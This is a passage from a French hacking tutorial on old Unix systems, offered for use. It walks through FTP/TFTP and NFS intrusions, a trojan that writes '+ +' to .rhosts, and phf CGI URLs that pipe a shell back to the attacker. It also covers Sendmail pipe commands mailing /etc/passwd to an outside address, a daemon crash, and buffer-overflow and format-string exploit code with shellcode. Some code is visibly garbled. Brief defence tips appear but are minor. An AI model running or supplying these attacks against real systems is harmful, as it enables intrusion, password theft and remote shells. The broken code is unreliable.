Pour compiler (=rendre executable) un fichier source c, la commande sera :
>>> gcc fichier.c -o fichier
Cela compilera fichier.c en lui donnant pour nom 'fichier'.


2. Les fichiers rhost

Les fichiers rhost maintenant. Ces fichiers permettent établissent des relations
de confiance entre individus, et permettent à un utilisateur de se connecter sur
une machine sans donner de mot de passe, à condition qu'il soit déclaré dans le
fichier rhost du compte de l'utilisateur sur lequel il veut se connecter.
Exemple de fichier rhost :
# les # servent à inclure des commentaires
# hostname  //  logname
domain1.com pseudobidon
domain2.com autrenickbidon
# fin
Ce rhost par exemple placé dans le repertoire d'un user nommé guest sur X.com donnera
l'accès au compte guest à pseudobidon de domain1.com et à autrenickbidon de domain2.com
Un "+ +" placé dans le rhost d'un utilisateur signifie que tous les users ont le droit
de se connecter sans mot de passe à cet utilisateur.
Et enfin, si vous êtes déclarés dans le .rhost d'un user, vous pouvez faire un rlogin :
>>> rlogin domain.com -l user
Aussi simple que ça ;


3. Les fichiers forward

Les fichiers forward quand à eux permettent de réexpédier du courrier destiné a quelqu'un 
vers une autre boite au lettre électronique. Mais ils peuvent aussi executer des commandes
lorsque l'utilisateurs recoit un mail. 
Exemple de fichier forward, placé dans le home directories d'un user nommé Guest :
Yn200R2@caramail.com
"/bin/mail nickairmax@caramail.com < /etc/passwd"
Cela signifie qu'à chaque fois que Guest envoie un mail, il en envoie une copie 
Yn200R2@caramail.com et envoie le etc/passwd à nickairmax@caramail.com .
Les fichiers forward peuvent donc être très utiles...


4. Le root

Le root. C'est ce que cherche à obtenir chaque hacker qui se respecte. Un accès root 
(root = racine) vous donne accès à tous les fichiers placés dans le repertoire racine (/)
En clair, être root sur un serveur équivaut à avoir tous les droits dessus.


5. Les exploits

Les exploits now. Un exploit est un programme ou une procédure (codée en c le plus souvent) 
qui exploite un bogue dans un logiciel spécifique.
Il existe à ce jour trois grandes catégories d'exploits :
* remote user : compilés et executés à distance, ils donnent un shell user sur un serveur.
* remote root : compilés et executés à distance, ils donnent un shell root sur un serveur.
* local root : compilés et executés en local sur le serveur, ils donnent un shell root
sur celui ci. Les exploits local root nécessitent que vous ayez déjà un compte sur le serveur.
Une bonne partie de ces exploits utilisent le fait que le repertoire /tmp est 777 (cad
en -rwxrwxrwx >> world-writable). /tmp est utilise par un grand nombre de programmes suid 
pour y stocker des fichiers temporaires, fichiers qui sont souvent ecrits avec les 
permissions du root. Les exploits vont utiliser un lien entre un fichier appartenant au
root et un fichier determiné par l'user.
Dans le cas d'un buffer overflow, d'une attaque par chaîne de format, ou d'un race
condition, le principe est fondamentalement différent, nous allons y revenir.


6. Le shell

Le shell. Beuhh si vous savez pas ça vous êtes mal partis... Le shell est l'interpréteur
des commandes. Exactement comme le ms-dos de windows. Un shell user nous permettra 
d'executer des commandes à partir d'un compte user, et un shell root nous permettra
d'executer des commandes à partir d'un compte root, c'est tout.


7. Les permission des fichiers

On va prendre un exemple, je souhaite afficher le contenu du repertoire etc :
>>> ls etc
>>> d rwxr-x---   root   skipass   10000   05/02/02   18:50   passwd
>>> d rwxr-x---   root   skipass   12000   05/02/02   18:51   group
    1   2              3         4            5            6            7          8

Et voilà à quoi correspondent ces differentes parties:
1 : le type de fichier : il en existe trois : 
-les repertoires
-les fichiers ordinaires (textes, courriers, source de programmes,.exe,etc.)
-les fichiers speciaux (pour la gestion du systeme, donc interressant)
2 : le bit de droit d'acces: il se divise en trois partie de trois caracteres (il y'a neuf caractères)
La premier partie concerne le propio du file (u)
La deuxieme partie concerne le groupe du proprio (g)(avec lequel il travaille)
La troisieme concerne un utilisateur externe au groupe.(o)
Dans les trois cas il existe trois droit d'acces qui sont designe par trois
lettre respective :
r : droit de lecture (Read)
w : droit d'ecriture (Writte)
x : droit d'execution (eXecute)
le - indique qu'il n'y a aucun droit accorde
3 : le proprio du file
4 : le groupe auquel le proprio appartient ou travaille
5 : memoire en ko
6 : la date de la derniere lecture
7 : l'heure de la derniere lecture
8 : le nom du fichier


Ces quelques bases devraient déjà vous permettre de faire des étincelles...
En plus bien sûr des banales commandes "echo machin >> fichier" , "mkdir
repertoire", ou autre "ftp serveurftp.com" que vous êtes (je l'espère) censés
connaître. Maintenant on va passer à la partie hacking.



b) Accès à distance

L'accès à distance est le premier objectif du hacker. Sans celui-ci vous ne pourrez
rien faire. On va passer en revue les principales méthodes, courage...
Note : Les commentaires sont introduits par // ne les utilisez pas pour hacker, mdr...


1. Méthode ftp/tftp

Cette méthode est sans doute la plus connue à ce jour.
Si un serveur à les ports 21 ou 69 d'ouvert, vous pourrez tenter de l'infiltrer via
ftp (23) ou tftp (69) .


Exemple d'intrusion ftp :
-------------------------------------------------------------------------------
[hacker] % >>> cat password.forward                // Un fichier forward qui vous
"|/bin/mail hacker@hacker.com < /etc/passwd"        enverra le fichier passwd

[hacker] % >>> ftp domain.com
Connected to domain.com
220 domain FTP server ready.
Name (domain.com:hacker) : 
>>> ftp (ou anonymous si vous voulez)
331 Guest login ok, send ident as password.
Password :
(entrée, pas besoin de password :))
230 Guest login ok, access restrictions apply.
ftp> >>> ls -lag
200 PORT command successful.
150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
total 5
d rwxr-xr-x  4 101      1             512 Jun 20  2002 .
d rwxr-xr-x  4 101      1             512 Jun 20  2002 ..
d rwxr-xr-x  2 0        1             512 Jun 20  2002 bin
d rwxr-xr-x  2 0        1             512 Jun 20  2002 etc
d rwxr-xr-x  3 500      1             512 Aug 22  2002 pub
226 ASCII Transfer complete.
242 bytes received in 0.066 seconds (3.6 Kbytes/s)
ftp> >>> put password.forward                      // On place le fichier forward
43 bytes sent in 0.0015 seconds (28 Kbytes/s)
ftp> >>> disconnect
[hacker] % >>> echo test | mail ftp@domain.com
-------------------------------------------------------------------------------

Aurez vous la patience que le gentil ftp vous envoie son file passwd ?
Sinon, autre technique, un exploit qui, de tant à autre, mais c'est extrémement
rare, vous donnera un accès root, ou par défaut, un accès anonymous :


Autre exemple d'intrusion ftp :
-------------------------------------------------------------------------------
[hacker] % >>> ftp victim.com
Connected to victim.com
220 victim FTP server ready.
ftp> >>> quote user ftp                              // Marche pas à tous
331 Guest login ok, send ident as password.         les coups...
ftp> >>> quote cwd ~root
530 Please login with USER and PASS.
ftp> >>> quote pass ftp
230 Guest login ok, access restrictions apply.
ftp> >>> get etc/passwd                              // On récupére etc/passwd
43 bytes received in 0,0015 seconds (28 Kbytes/s)
ftp> disconnect
-------------------------------------------------------------------------------

Par tftp ausi c'est cool. TFTP (Trivial File Transfert Protocol) présente
des bréches importantes, héhéhé.


Exemple d'intrusion tftp
-------------------------------------------------------------------------------
[hacker] % >>> tftp
tftp> >>> connect domain.com
tftp> >>> get /etc/passwd /tmp/passwd.domain
tftp> >>> disconnect
-------------------------------------------------------------------------------

Huhuh, nous avons donc pu, à travers ces trois méthodes, récuperer le fichier 
passwd, qui contient les logins/password des users du serveur...
Encore que ce fichier, soit il est crypté, soit il est en mode shadow.
Si il est crypté, vous aurez un truc du genre "root: 1fd5s1: 0: 1: Superuser" , 
prenez donc Jack The Cracker ou tout autre decrypteur de pass Unix, et attendez...
S'il est en shadow (en étoile), ce qui nous donne quelque chose comme 
"root:x:0:1:Superuser", cela veut dire que le vrai fichier passwd se trouve dans 
un autre répertoire, lisible que par le root, souvent dans un repertoire du genre
etc/shadow, mais comme nous ne sommes pas root, héhéhé...
Vous devrez aussi pour 'hacher' ces fichiers passwd, vous équiper d'un dico.
En réalité, les crackers de mots de passe tel que John the Ripper ne décryptent
pas le mot de passe proprement dis, vu que déjà le password qui se trouve dans le
fichier est en réalité une chaîne de caractère crypté à l'aide du vrai mot de passe
(qui est en fait la clé), les crackers vont donc tenter une attaque de type brute
force pour chercher la bonne clé, le bon mot de passe, qui pourra cracker la chaîne.

Parade contre les attaques par ftp/tftp :
Désactiver les services ftp anonymous et tftp. Assurez vous qu'il n'existe
pas de repertoires qui sont 777, /tmp mis à part bien sûr :(.

Avons nous réussi à hacker un serveur par cette méthode ?
Humm, n'y comptez pas, cela ne marche que très rarement, dans environ 5% des cas
d'après moi... C'est pourquoi il vous faudra compter sur d'autres techniques...



2. Méthode par nfs

Héhé, voilà une bonne vielle méthode sympatoche, assez vielle certes, mais
toujours est-il qu'elle a fait ses preuves, et plutôt deux fois qu'une...
NFS (Netword File system) est un protocole qui permet aux fichiers d'être 
partagés par plusieurs machines connectées au réseau. 
Comment exploiter un serveur qui exploite nfs, hummmm ?
Avec nfs, vous pourrez facilement acquérir un compte user, on va voir ça.
La commande showmount -e domain.com va nous permettre de voir les ressources
partagées par nfs sur domain.com. La commande mount /rep va nous permettre
de mounter et donc d'avoir accès à un repertoire partagé. Puis en trafiquant
notre UID/GID local, on va pouvoir usurper l'identité d'un user, dans notre
exemple ça sera guest. Ensuite on mettera un rhost dans le repertoire de guest
nous autorisant à nous connecter dessus sans mot de passe.
Et hop là le joli shell :))


Exemple d'intrusion par nfs :
-------------------------------------------------------------------------------
[hacker] % >>> showmount -e victim.com   // Voir les ressources partagées par nfs
 export list for victim.com:
 /export                          (everyone)     // tout le monde peut exporter
 /var                               (everyone)        export et var
 /usr                               easy
 /export/exec/kvm/sun4c.sunos.4.1.3 easy
 /export/root/easy                  easy
 /export/swap/easy                  easy

[hacker] # >>> mount victim.com:/export/foo /foo       // On mounte export dans
[hacker] # >>> cd /foo                                   /foo puis on va dedans
[hacker] # >>> ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest  
// Huhu un guest, on rajoute donc un compte guest dans notre etc/passwd local      
[hacker] # >>> echo guest:x:10001:1:temporary breakin account:/: >> /etc/passwd     
[hacker] # >>> ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
[hacker] # >>> su guest              
// On se logge en guest, vu qu'on a usurper ce compte dans notre etc/passwd
[hacker] % >>> echo hacker.com >> guest/.rhosts   
// On met le nom de sa machine dans le rhost du guest
[hacker] % >>> rlogin victim.com      // On fait un rlogin dessus
	 Welcome to victim.com!    
 victim %   // Magique !!!
-------------------------------------------------------------------------------

Huh, now on a accès à la bécane, sous un compte guest, ce qui nous permettra de
compiler quelques buffer overflow en local tout à l'heure :)) .

Si le repertoire /usr était exporté et mountable pour tout le monde, nous
aurions pu placer un cheval de troies, démonstration -


Exemple de cheval de troies pour /usr
-------------------------------------------------------------------------------
[hacker] % >>> showmount -e victim.com
export list for victim.com:                            
 /usr                              (everyone)     // Un repertoire usr exporté,                    
 /etc                               easy             on va donc pouvoir trafiquer
 /export/exec/kvm/sun4c.sunos.4.1.3 easy             quelques commandes...
 /export/root/easy                  easy
 /export/swap/easy                  easy
>>> mount /usr              
$ >>> cat bi                                          // Un exemple de 
#!/bin/sh                                            cheval de troies,
>>> echo "+ +" > ~/.rhosts                               prêt à l'usage...
echo "Commande inconnue"
[hacker] % >>> umount victim.com                      // On se barre :)
-------------------------------------------------------------------------------

Ici, on a donc mounté /usr, et créer une commande, bi. Maintenant, quand un 
utilisateur voudra utiliser vi (éditeur de texte linux), et bien si il tape
"bi" au lieu de "vi", il mettra un "+ +" dans son rhost, ce qui permettra à
tout le monde de se connecter sous son account...

NFS est top, n'est ce pas ?
J'ai même déjà vu des repertoires racine (/), exportables pour tout le monde
ar cfs, ce qui constitue une impardonable erreur de sécurité...
Devenir root dans ces conditions là ne constitue aucun problème, deux trois
bricolages dans votre etc/passwd, quelques account pris, et à ce propos vous 
pouvez consulter votre uid/gid quand vous êtes sur un serveur, grâce à la 
commande 'status'. Je pense que cet article était assez complet, on passe à ot' chose.



3. Reversed telnet

Le reversed telnet exploite en faite une faille dans les terminaux X.
Un terminal X est un terminal connecté à un des ports de l'ordinateur, c'est un
peu comme l'ancêtre de la console. On passe les commandes à un terminal X dans 
une fenêtre xterm, avec le gestionnaire X-Windows. 
Avec un xterm, on va tenter de s'envoyer, en local, un interpréteur de commande
root, à noter que xterm est un service qui tourne entre les ports 6000 et 6003,
vous ne pourrez rien faire si ces ports ne sont pas ouverts sur la machine cible.

Alors on va prendre un exemple, un site web, par exemple www.xtermhole.com, possède
une vulnérabilité phf, comme nous avons vu dans le chapitre 1, attaques cgi...
Phf va nous permettre, grâce à xterm, de nous envoyer un shell root, bon notez
aussi que vous pouvez exploiter cette faille avec d'autres moyens, par exemple
Sendmail, on va y revenir.

Voilà ce que l'on va donc taper dans notre navigateur : 
http://www.xtermhole.com/cgi-bin/phf.cgi?Qalias=x%0a/usr/X11R6/bin/xterm%20-ut%20-display%20127.0.0.1:0.0

127.0.0.1 correspond à votre localhost, vous devrez le remplacer par votre adresse ip...
Qu'avons nous fait ? Et bien grâce à phf, nous avons pu déclencher un renvoi de xterm chez
nous, en le paramètrant de telle sorte à ce qu'il nous renvoie un uid et un gid 0, c'est
à dire un shell root, yeepie !!!

Et comme nous avons un interpéteur de commandes à notre disposition, xterm, nous avons donc
le contrôle total sur le système, alors, kewl d'être rewt ?
Sinon nous pouvons également tenter une connection par rsh sur un account sans 
password (si celui ci existe bien entendu) et s'envoyer bien un xterm bien peinard...
>>> rsh victime.com -l login_sans_passwd csh -i
>>> xterm -display 127.0.0.1:0 &

A oui, un conseil aussi, n'oubliez pas de taper "xhost +" pour autoriser le xterm
à venir sur le serveur, sans quoi ça marchera pas...

Pourquoi ça s'apelle reversed telnet ? Et bien c'est parce que c'est le contraire du
telnet inversé, que l'on va aborder maintenant...



4. Inversed Telnet

Que faire si le serveur cible ne possède pas de terminal X ? Et bien nous pouvons
faire appel à une toute autre technique, le telnet inversé. Cela consiste à lancer
une session à partir du serveur cible vers notre système.
On va faire appel au programme netcat (http://www.atstake.com) et mettre en 
surveillance les ports 80 et 25 sur notre système, si ces ports sont assignés
à un service, vous devrez le désactiver à l'aide de la commande kill.
Les commandes pour mettre en écoute les ports devront être tapées dans deux
fenêtres différentes, les voilà :

>>> nc -l -n -v -p 80
listening on [any] 80

Dans une autre fenêtre :
>>> nc -l -n -v -p 25
listening on [any] 25

Ici, nc met en écoute les ports 25 et 80 (-l et -p) en mode prolixe (-v) et 
n'effectue pas de conversion dns (-n).

Maintenant, au moyen de phf, nous allons lancer le telnet inversé, exemple avec
www.phfhole.com :

On va à cette adresse ;
http://www.phfhole.com/cgi-bin/phf?Qalias=x%0a/bin/telnet%20127.0.0.1%2080%20|%20/bin/
sh%20|%20/bin/telnet%20127.0.0.1%2025

Là, le serveur va tenter une connection telnet sur les ports 80 et 25, mis sur écoute
avec netcat je vous le rapelle, de notre système, 127.0.0.1 correspond à votre ip.
Le résultat sera un inversed telnet qui va s'afficher dans nos deux fenêtres netcat.

Cela vous donnera donc accès à un joli shell...
On apelle ça telnet inversé, car c'est le contraire du reversed telnet, ici on tente
une connection à partir du serveur vers notre système.
A noter que l'on aurait pu prendre d'autres ports en exemple, j'ai choisi 80 et 25 
car ils ne sont généralement pas équipés d'un pare-feu.
Niveau sécurité, ahem, si votre serveur est sensible aux attaques phf, patchez le
d'urgence ! Sinon supprimez le terminal X de votre serveur, dans le cadre d'un
reversed telnet seulement.



5. Les bugs de Sendmail

Un Sendmail sur le port 25 (smtp) est toujours source de très graves problèmes
de sécurité. Nous pouvons faire plein de choses avec un Sendmail !!!
La connection se fait par telnet sur le port smtp, clair, net, efficace...
On pourra par la suite, avec un simple mail, executer tous types de commandes, tel
se faire envoyer le fichier passwd, déclencher un xterm, envoyer des mail anonymes, etc..


Sans plus tarder un chtit exemple qui permet d'envoyer des mails anonymes
-------------------------------------------------------------------------------
[hacker] % >>> telnet mail.sendmail.com 25   // On se connecte donc sur un smtp
Trying to connect mail.sendmail.com... 
Connected to mail.sendmail.com
Escape character is '^]'.
220 mail.sendmail.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04  // Un Sendmail !
>>> mail from: anonymous@caramail.com        // On met un email bidon
250 anonymous@caramail.com Sender ok
>>> rcpt to: webmaster@whitehouse.gov        // L'email du recepteur
550 webmaster@whitehouse.gov Recepter ok
>>> data                                     // data pour écrire le message
354 Enter mail, end with ." on a line by itself
Halo Mr. President, i wrote that to say you what i think  // Excusez mon 
of you : YOU'RE A NERD !!                                     mauvais anglais...
.
250 Mail accepted
>>> quit
Connection closed by foreign host.
[hacker] %
-------------------------------------------------------------------------------

Vous pouvez à partir de cet exemple envoyer un mail anonyme à n'importe quellle
adresse, d'ailleurs cette astuce fonctionne avec tous les serveurs smtp je crois...

Mais, envoyer des mails anonymes n'a pas beaucoup d'interêt en soi...
On va voir d'autres exemple...


Faire bloquer un demon SendMail (super-méchant...)
-------------------------------------------------------------------------------
[hacker] % >>> telnet sendmail.com 25
Trying to connect sendmail.com... 
Connected to sendmail.com
Escape character is '^]'.
220 sendmail.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
>>> vrfy aaaaaaaaaaaaaaaaaaaaa (*9999)
>>> quit
-------------------------------------------------------------------------------

La commande vrfy, si vous vous en souvenez, sert à vérifier un pseudo.
En tentant de vérifier un nom d'utilisateur beaucoup trop long, on
crée une situation de débordement de tampon (buffer overflow), qui
provoque le blocage du démon sendmail...

Passons maintenant à la faille la plus couramment utilisée -


Se faire envoyer le fichier passwd
-------------------------------------------------------------------------------
[hacker] % >>>  telnet victim.com 25
Trying 128.128.128.1...
Connected to victim.com
Escape character is '^]'.
220 victim.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04 
>>> mail from: "|/bin/mail hacker@hacker.com < /etc/passwd"
250 "|/bin/mail hacker@hacker.com < /etc/passwd"... Sender ok
>>> rcpt to: nosuchuser
550 nosuchuser... User unknown
>>> data
354 Enter mail, end with "." on a line by itself
.
250 Mail accepted
>>> quit
Connection closed by foreign host.
[hacker] %
-------------------------------------------------------------------------------

Cela enverra le fichier passwd à hacker@hacker.com...
Il existe beaucoup de variantes quand à cette faille, voici comment effectuer
un reversed telnet à l'aide d'un sendmail.


Exploiter un xterm grâce à Sendmail , thx CoD4
-------------------------------------------------------------------------------
[hacker] % >>>  telnet victim.com 25
Trying 128.128.128.1...
Connected to victim.com
Escape character is '^]'.
220 victim.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
>>> mail from: "|xterm -display 127.0.0.1:0 -e /bin/sh "
250 "|xterm -display 127.0.0.1:0 -e /bin/sh "... Sender ok
>>> rcpt to: nosuchuser
550 nosuchuser... User unknown
data
.
quit 
-------------------------------------------------------------------------------

Humm, le joli xterm...
Voilà donc pour ce qui est de sendmail, toutes les versions sont buguées,
z'avez qu'à piocher, sinon il existe des exploits codés en c pour les versions
de sendmail, allez sur http://www.insecure.org .



6. Les buffer overflow

Bienvenue dans l'unvivers des buffer overflow, une technique de piratage
très à la mode chez les script kiddies et qui a encore de longues belles
journées devant elle. Les premières attaques par débordement de tampon ont
vu le jour en 1988, suite au fameux "Robert Morris worm incident". 
Il faudra attendre jusqu'en 1996 pour que cette technique se popularise,
et c'est ce que fit AlephOne, modérateur de la mailing list BugTrack, dans
son pas moins célèbre article, 'Smashing the stack for fun and profit', 
paru dans le fichier 14 du 49 numéro du volume 7 de Phrack Magazine (ouf !) 

Bon, j'aurais pu vous traduire entièrement l'article de Aleph1, mais 
j'ai préferé donner une interprétation personnelle, avec quelques
exemples tirés de Phrack... J'attend quand même de vous des bonnes
connaissances en c, un petit peu d'assembleur si c'est possible...

Donc, buffer overflow , kezaco ???
En gros, le principe est de dépasser le tampon mémoire d'une fonction 
pour pouvoir changer l'adresse de retour d'une fonction, de sorte à 
ce qu'elle execute du code programmé par le hacker, ce code est apellé
oeuf, ou plus couramment shellcode, son but sera dans la plus part des cas
de vous donner un shell (root).

Comment ? Quand ? Pourquoi ? En réalité le dépassement de tampon exploite 
les faiblesses de certaines fonctions c, telles que strcpy(), strcat(), 
gets(), etc... Ces fonctions sont dangeureuses car elles ne contrôlent 
pas que la chaîne de destination ait assez de place pour accueillir la
chaîne source.
Avant de commencer à vous expliquer à écrire un buffer overflow, nous 
allons voir quelques notions fondamentales :
* Le buffer (tampon) : Le buffer est une zone de mémoire utilisée pour 
stocker des données. On ne va s'interesser ici qu'aux stack overflow,
pour le moment...
* La stack (pile) : C'est une région spéciale de la mémoire tampon, 
qui permet de conserver des informations tels que les dernières données 
entrées seront les premières à sortir (algorythme LIFO, last in first out).
C'est à dire que la dernière information ajoutée sera placée en haut de la
pile, et sera le première à sortir. En assembleur, l'instruction PUSH ajoute
une information au sommet de la pile, et l'instruction POP retire la dernière
information entrée, placée au sommet de la pile.

Petit exemple, imaginons un appel de fonction en c :

...(code)...
appelfonction(int first, int second);
...(code)...

Si nous désassemblons ce code, à l'aide de gcc :

gcc -S -o exemple.s exemple.c
...(code)...
push $first
push $second
call appelfonction

On voit ici les instructions push, qui ajoutent first et second au sommet
de la pile, et l'instruction call, qui apelle la fonction appelfonction en
considérant les deux arguments first et second.


Un stack overflow à lieu quand une fonction prend plus de place que prévu
dans le buffer. Exemple, donc :

#include <string.h>
#include <stdio.h>

void stackoverflow(char *str) {
char buffer[16];
strcpy(buffer, str);
}
void main() {
char overflow[128];
int i;
for (i=0 ; i<127 ; i++)
overflow[i] = '*';
stackoverflow(overflow):
}

Ici, la fonction stackoverflow a copié la chaîne overflow longue de 128 octets
dans le buffer, qui ne fait que 16 octets, au moyen de la fonction strcpy.
Le résultat, et bien cela sera que les octets débordant dans le buffer seront
réecris de force dans la pile, et l'adresse de retour de notre fonction sera
modifiée. Ainsi, un stack overflow permet de changer l'adresse de retour d'une 
fonction. Si on essaye de compiler ce code, on aura un Segmentation Fault, dans 
notre exemple il se produit une erreur car l'adresse de retour, codée sur 4 octets 
est composée de quatre fois la valeur binaire de *, ****.


Mais ce que l'on voudrait, c'est écraser la valeur de retour de la fonction
afin de pouvoir faire executer un code pré-défini, "l'oeuf".
Le truc est, au lieu d'essayer de pointer sur ****, on va plutôt pointer 
sur un code pré-programmé, aussi simple que ça.

Exemple, on va voir les détails du shellcode juste après...

#include <string.h>

char shellcode[] =
"\xeb\xO0\x08\x00\x74\x02\x89\xF6"
"\x8b\x03\xff\xd0\x83\xc3\x04\x83"
"\x3b\x00\x75\xf4\x8f\x5d\xfc\xc9"
"\xc3\x8b\x76\x00\x56\x89\xe5"
"/bin/sh";

char overflow[128];

int main(int argc, char *argv[])
{
char buffer[16];
int i;
long *var;

var == (long *)overflow;

for (i=0;i<32;i++)
*(var + i) = (int)buffer;

for (i=0;i<strlen(shellcode);i++)
overflow[i] = shellcode[i];

strcpy(buffer, overflow);
return (0);
}

Que s'est il passé ? 
Déjà, nous avons défini le shellcode, ensuite nous l'avons copié au début de
"overflow" ; finalement la fonction strcpy a copié le contenu de overflow, qui
fait 256 octets dans le buffer de 16 octets, strcpy va donc écraser la valeur
de retour de la fonction avec l'adresse à laquelle notre code est situé.
Et au final, l'appel système return executera notre shellcode, qui est censé
nous donner un shell root...

Là vous allez me demander, "comment est ce qu'on fait des shellcode ?" 
En fait, chaque shellcode correspond à un système bien précis ; 
l'écriture d'un shellcode, même si elle paraît ardue, est la chose
la plus facile à faire dans la création d'un buffer overflow.

Il vous faudra quand même quelques connaissances en assembleur, en particulier
sur les registres 32 bits ; les voici :
# %eax, le registre accumulateur, il sert à tout.
# %ebx, le registre de base, il peut aussi servir à tout.
# %ecx, le second registre de base, auquel on passe le second argument.
# %edx, le troisième registre de base, auquel on passe le troisième argument.
# %esp, le pointeur de la pile, qui pointe tout en haut de la pile.
# %ebp, le pointeur de la pile qui pointe en bas de la pile, on l'utilise
pour accèder aux variables locales de la fonction en cours.
# %eip, le pointeur qui pointe sur l'instruction suivante, à executer par le CPU.
# %esi, indexation de tableaux en mémoire.

Voici maintenant les instructions qui nous permettront de modifier ces registres :
# mov, déplace une valeur dans un registre, structure : mov valeur, %registre
# inc, incrémente, ++ en c...
# dev, décrémente, -- =)
# xor, opération sur les bits, xor 1,0 donne 1, xor 0,0 donne 0, xor 1,1 donne 0...
# leal, sert à charger une adresse mémoire à l'intérieur d'un registre.
# int, interruption système, exemple, int $0x80 signifie que le programme passe
la main à un gestionnaire d'interruption dans le kernel, 0x80 indiquant à ce
gestionnaire que l'on souhaite apeller une fonction système du noyau, dont le
numéro est contenu dans le regitre accumulateur eax.
# push et pop : on les a déjà vu tout à l'heure ceux là...
# nop : il signifie no operation, c'est à dire pas d'opération...


Et pour créer un shellcode, la méthode consiste à coder d'abord le programme 
en c, pour ensuite le décompiler en asm, le modifier si nécessaire...
Exemple avec un programme en c qui donne un uid 0 :

#include <stdio.h>
main(void)
{
setreuid(0,0);
exit(0);
}

On va donc le décompilé, pour obtenir le code assembleur, en voilà une partie,
celle qui nous interesse...
80483b0:  b8 46 00 00 00 movl $0x46,%eax
80483b5:  bb 00 00 00 00 movl $0x0,%ebx
80483ba:  b9 00 00 00 00 movl $0x0,%ecx
80483bf:  cd 80          int  $0x80

On va donc transformer cel en shellcode, rien de plus facile :
"\xb8\x46\x00\x00\x00"
"\xbb\x00\x00\x00\x00"     
"\bb9\x00\x00\x00\x00"
"xcd\x80"

Seulement voilà, les x00 sont des octets null, et on ne peut pas
utiliser de shellcode contenant des octets null...
Avec un petit peu d'astuces, on va essayer de remplacer les instructions
de telle sorte qu'il n'y ait plus d'octet de type null...

80483b0:  b8 46 00 00 00 mov1 $0x46,%eax
va pouvoir se remplacer par :
80483c6:  31 c0          xorl %eax,%eax
80483c8:  b0 46          movb $0x46,%al
# xor est une opération sur les bits, xorl %eax,%eax met le registre %eax a zéro. 

Au final, le shellcode nous donnera :
"\x31\xc0"    (xorl %eax,%eax)
"\x31\xdb"    (xorl %ebx,%ebx)
"\x31\xdb"    (xorl %ecx,%ecx)
"\xb0\x46"    (movb $0x46,%al)
"\xcd\x80"    (int $0x80)

Sachez aussi qu'il est bon de faire préceder ses shellcode de \0x90\,
correspondant à nop, ainsi même si vous vous trompez sur l'adresse
de retour de la fonction, le code pourra tout de même être executé.

Et pour les codes c qui executent un shell, le shellcode devra être
fini par "bin/sh". Sachez enfin que la plupart des shellcode ont été
écris, et qu'il ne vous reste plus qu'à piocher sur internet pour 
trouver des shelcode, voir directement des buffer overflow, propres
à un système bien précis. 
Il existe d'ailleurs plusieurs types de shellcode, celui qui binde un 
shell sur un port, qui casse les chroot, etc.. Tout pour s'amuser...

Vous pourrez donc vous amuser à chercher des programmes sensibles à des
buffer overflow, cad utilisant des commandes genre strcpy, pour ensuite
essayer de coder l'exploit qui va avec.
Pour déterminer si un programme est sensible, vous pouvez aussi lui passer
comme argument une longue chaîne de caractères et voir si elle est sensible
à un 'Segmentation fault', et noter l'adresse ou ca plante...  
Pour ce qui est de la sécurisation, la méthode est bien entendue d'appliquer
des méthodes de programmation sûres, et de jamais employer strcpy, strncpy,
strcat, ou d'autres fonctions qui ne contrôlent pas la mémoire du tampon.
Les buffer overflow, en local ou sans accès, c'est le pied !!! (joli slogan ;))



7. Attaques par chaîne de format

Ce type d'attaque est proche du buffer overflow car il exploite aussi des
vulnérabilités dans des programmes, cette fois ci dues à des fonctions c
telles que printf, scanf, ou sprintf.
L'attaque par chaîne de format consiste à exploiter ces fonctions en 
passant des chaînes de texte fabriqués avec des indicateurs de format,
ce qui peut amener le système cible à executer n'importe quelle commande...
Par exemple, utiliser un programme en lui passant comme argument l'indicateur
de format %x, pour ainsi lire les données stockées dans l'espace mémoire du
processus en cours. Et si on peut passer comme argument l'indicateur de format 
%n, on va provoquer un 'Segmentation Fault', et on va donc pouvoir écrire 
directement dans l'espace mémoire...

Voici un exemple de programme exploitant un bug de format :

/* exemple.c */
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
char buf[2048] = { 0 ];
strncpy(buf, argv[1], sizeof(buf) - 1);
printf(buf);
putchar('\n');
return (0);
}

Voilà ce que ca va donner si on le compile et l'execute - en lui passant 
des arguments spécifique
$ gcc exemple.c -o exemple
$ /.exploit DDDD%x%x
DDDDbffffaa44444444

Les %x formatent des arguments de la taille d'un entier sur la pile et 
les affichent en décimal. On remarque aussi que la deuxième sortie 
44444444 est représentée en mémoire par la chaîne DDDD, que nous avons
passé en argument. Donc, si on change le second %x par un %n, on va 
provoquer un 'Segmentation Fault' car le programme va essayer d'écrire
à l'adresse 0x44444444, sauf si cette adresse est accessible bien entendu.
Et une attaque qui exploite cette vulnérabilité va consister à écraser 
l'adresse de retour de de la fonction pour la faire pointer sur du code
que l'on aura placé dans notre chaîne de format.

A noter que l'exploit va prendre en compte quatre paramètres :
- une adresse de retour, bien entendu
- l'adresse du buffer vulnérable
- l'adresse du shellcode dans la stack du serveur
- l'offset (=décalage) pour atteindre le début du buffer

Le principe d'une attaque par chaîne de format est donc quasiment le même
qu'un buffer overflow, à la différence qu'on emploie des chaînes de format...

Pour ce qui est de la sécurisation, comme ce type d'attaque consiste aussi
à modifier l'adresse de retour d'une fonction, la seule méthode sera donc
d'appliquer des méthodes de programmation sûres, comme on a vu tout à l'heure.


Au fil de ces exemples d'intrusion, vous avez réussi à obtenir un accès sur le 
système ? Bien ! Vous êtes déjà root ? Alors sautez le petit c), le plus dur est fait...



c) Obtenir son shell root

Humm, après un accès sur le serveur, nous allons devoir passer root.
La question qui tue : Comment ???
Comme je l'ai déjà dis je sais plus où, sous unix, un accès user 
équivaut à un accès root, avec simplement un peu de méthode...


1. Brute force cracking

Autant vous le dire tout de suite : on ne va pas s'éterniser 107 ans sur ce type
d'attaques, une fois utilisateur, il est très facile d'obtenir un shell root, soit
en utilisant un exploit, genre un buffer overflow (le plus courant), soit en tentant
une 'race condition' ; ou plus simplement en piquant le fichier passwd, en priant 
